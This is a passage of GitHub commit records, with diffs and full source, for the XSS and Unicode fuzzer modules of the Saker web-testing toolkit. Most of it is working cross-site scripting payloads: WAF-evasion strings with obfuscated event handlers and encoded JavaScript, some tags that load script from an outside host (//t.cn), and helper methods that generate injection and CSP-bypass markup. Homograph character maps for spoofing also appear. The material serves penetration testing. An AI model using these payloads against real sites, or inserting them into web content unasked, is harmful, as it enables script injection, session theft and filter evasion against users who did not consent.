b/saker/fuzzers/xss.py\n@@ -280,6 +280,8 @@\n \n # xss payloads\n _payloads = [\n+    '<q/oncut=open()>',\n+    '<svg/onload=eval(name)>',\n     '<img src=x onerror=alert(/xss/)>',\n     \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n     \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n", "message": "", "files": {"/saker/fuzzers/code.py": {"changes": [{"diff": "\n \n import random\n import string\n-from urllib import quote\n+from urllib.parse import quote\n+from unicodedata import normalize\n from saker.fuzzers.fuzzer import Fuzzer\n \n \n", "add": 2, "remove": 1, "filename": "/saker/fuzzers/code.py", "badparts": ["from urllib import quote"], "goodparts": ["from urllib.parse import quote", "from unicodedata import normalize"]}], "source": "\n import random import string from urllib import quote from saker.fuzzers.fuzzer import Fuzzer class Code(Fuzzer): \"\"\"Code Payload\"\"\" homograph={ 'a': '\\u0430', 'c': '\\u03F2', 'd': '\\u0501', 'e': '\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt) s=s.replace(\"A\", \"\u0104\", cnt) s=s.replace(\"a\", \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\", \"\u0430\", cnt) s=s.replace(\"e\", \"\u0451\", cnt) s=s.replace(\"o\", \"\u043e\", cnt) return s @staticmethod def fuzzErrorUnicode(s): return s +chr(random.randint(0xC2, 0xef)) @staticmethod def urlencode(s, force=False): if not force: s=quote(s) else: s=map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s) s=\"\".join(s) return s ", "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport random\nimport string\nfrom urllib import quote\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass Code(Fuzzer):\n\n    \"\"\"Code Payload\"\"\"\n\n    homograph = {\n        'a': '\\u0430',\n        'c': '\\u03F2',\n        'd': '\\u0501',\n        'e': '\\u0435',\n        'h': '\\u04BB',\n        'i': '\\u0456',\n        'j': '\\u0458',\n        'l': '\\u04CF',\n        'o': '\\u043E',\n        'p': '\\u0440',\n        'r': '\\u0433',\n        'q': '\\u051B',\n        's': '\\u0455',\n        'w': '\\u051D',\n        'x': '\\u0445',\n        'y': '\\u0443',\n    }\n\n    def __init__(self):\n        super(Code, self).__init__()\n\n    @staticmethod\n    def fuzzAscii():\n        for i in xrange(256):\n            yield chr(i)\n\n    @staticmethod\n    def fuzzUnicode(cnt=1):\n        for i in xrange(cnt):\n            yield unichr(random.randint(0, 0xffff))\n\n    @staticmethod\n    def fuzzUnicodeReplace(s, cnt=1):\n        # Greek letter\n        s = s.replace(\"A\", \"\u0100\", cnt)\n        s = s.replace(\"A\", \"\u0102\", cnt)\n        s = s.replace(\"A\", \"\u0104\", cnt)\n        s = s.replace(\"a\", \"\u03b1\", cnt)\n        # Russian letter 1-4\n        s = s.replace(\"e\", \"\u0435\", cnt)\n        s = s.replace(\"a\", \"\u0430\", cnt)\n        s = s.replace(\"e\", \"\u0451\", cnt)\n        s = s.replace(\"o\", \"\u043e\", cnt)\n        return s\n\n    @staticmethod\n    def fuzzErrorUnicode(s):\n        # https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html\n        return s + chr(random.randint(0xC2, 0xef))\n\n    @staticmethod\n    def urlencode(s, force=False):\n        if not force:\n            s = quote(s)\n        else:\n            s = map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s)\n            s = \"\".join(s)\n        return s\n"}}, "msg": "update code and xss fuzz"}, "9d984e18d74febb18c47c74a2e0ad9fe6efc0478": {"url": "https://api.github.com/repos/LyleMi/Saker/commits/9d984e18d74febb18c47c74a2e0ad9fe6efc0478", "html_url": "https://github.com/LyleMi/Saker/commit/9d984e18d74febb18c47c74a2e0ad9fe6efc0478", "sha": "9d984e18d74febb18c47c74a2e0ad9fe6efc0478", "keyword": "XSS update", "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 4f1511f..235222d 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -282,13 +282,15 @@\n _payloads = [\n     '<q/oncut=open()>',\n     '<svg/onload=eval(name)>',\n+    '<svg/onload=eval(window.name)>',\n+    '<svg/onload=eval(location.hash.slice(1))>',\n     '<img src=x onerror=alert(/xss/)>',\n     \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n     \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n     \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n-    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n+    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n ]\n \n # payload for waf test\n@@ -319,7 +321,9 @@\n     '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n     '<img src=x onerror=confir\\u006d`1`>',\n     '<svg/onload=co\\u006efir\\u006d`1`>',\n-    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>'\n+    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n+    '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n+    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n ]\n \n # payload with html 5 features\n", "message": "", "files": {"/saker/fuzzers/xss.py": {"changes": [{"diff": "\n _payloads = [\n     '<q/oncut=open()>',\n     '<svg/onload=eval(name)>',\n+    '<svg/onload=eval(window.name)>',\n+    '<svg/onload=eval(location.hash.slice(1))>',\n     '<img src=x onerror=alert(/xss/)>',\n     \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n     \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n     \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n-    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n+    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n ]\n \n # payload for waf test\n", "add": 3, "remove": 1, "filename": "/saker/fuzzers/xss.py", "badparts": ["    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\","], "goodparts": ["    '<svg/onload=eval(window.name)>',", "    '<svg/onload=eval(location.hash.slice(1))>',", "    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\""]}], "source": "\n from saker.fuzzers.fuzzer import Fuzzer _tags=[ 'a', 'abbr', 'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', 'onunload', 'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitfullscreenerror', 'onwebkitkeyadded', 'onwebkitkeyerror', 'onwebkitkeymessage', 'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ", "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"}}, "msg": "update xss payload"}, "9d9faf7de059066aab203f069eade13e89a93b39": {"url": "https://api.github.com/repos/LyleMi/Saker/commits/9d9faf7de059066aab203f069eade13e89a93b39", "html_url": "https://github.com/LyleMi/Saker/commit/9d9faf7de059066aab203f069eade13e89a93b39", "sha": "9d9faf7de059066aab203f069eade13e89a93b39", "keyword": "XSS update", "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 235222d..9bafac0 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -293,6 +293,22 @@\n     \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n ]\n \n+# reg test payloads\n+_reg_payloads = [\n+    # no reg\n+    \"<svg\",\n+    # <[a-z]+\n+    \"<dev\",\n+    # ^<[a-z]+\n+    \"x<dev\",\n+    # <[a-zA-Z]+\n+    \"<dEv\",\n+    # <[a-zA-Z0-9]+\n+    \"<d3V\",\n+    # <.+\n+    \"<d|3v \",\n+]\n+\n # payload for waf test\n _waf_payloads = [\n     \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n@@ -323,7 +339,15 @@\n     '<svg/onload=co\\u006efir\\u006d`1`>',\n     '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n     '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n-    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n+    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be',\n+    '<a\"/onclick=(confirm)()>click',\n+    '<a/href=javascript&colon;alert()>click',\n+    '<a/href=&#74;ava%0a%0d%09script&colon;alert()>click',\n+    '<d3v/onauxclick=[2].some(confirm)>click',\n+    '<d3v/onauxclick=(((confirm)))\">click',\n+    '<d3v/onmouseleave=[2].some(confirm)>click',\n+    '<details/open/ontoggle=alert()>',\n+    '<details/open/ontoggle=(confirm)()//'\n ]\n \n # payload with html 5 features\n@@ -351,6 +375,7 @@ class XSS(Fuzzer):\n     htmlTemplate = _htmlTemplate\n     probes = _probes\n     payloads = _payloads\n+    reg_payloads = _reg_payloads\n     waf_payloads = _waf_payloads\n     h5payloads = _h5payloads\n \n@@ -380,24 +405,48 @@ def acmehttp01(cls, url):\n         # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n         return url + '/.well-known/acme-challenge/?<h1>hi'\n \n-    def img(self, payload):\n+    @classmethod\n+    def img(cls, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n-    def svg(self, payload):\n+    @classmethod\n+    def svg(cls, payload):\n         return '<svg/onload=\"%s\"/>' % payload\n \n-    def style(self, payload):\n+    @classmethod\n+    def style(cls, payload):\n         return '<style/onload=\"%s\"></style>' % payload\n \n-    def input(self, payload):\n+    @classmethod\n+    def input(cls, payload):\n         return '<input/onfocus=\"%s\"/autofocus>' % payload\n \n-    def marquee(self, payload):\n+    @classmethod\n+    def marquee(cls, payload):\n         return '<marquee/onstart=\"%s\"></marquee>' % payload\n \n-    def div(self, payload):\n+    @classmethod\n+    def div(cls, payload):\n         return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n+    @classmethod\n+    def template(cls, tag=\"img\", delimiter=\" \", event_handler=\"onerror\", javascript=\"alert(/xss/)\", ending=\">\"):\n+        '''\n+        delimiter \" \"\n+        delimiter \"\\x09\"\n+        delimiter \"\\x09\\x09\"\n+        delimiter \"/\"\n+        delimiter \"\\x0a\"\n+        delimiter \"\\x0d\"\n+        delimiter \"/~/\"\n+        ending \">\"\n+        ending \"//\"\n+        ending \" \"\n+        ending \"\\t\"\n+        ending \"\\n\"\n+        '''\n+        return f\"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}\"\n+\n     def script(self):\n         payload = \"<script 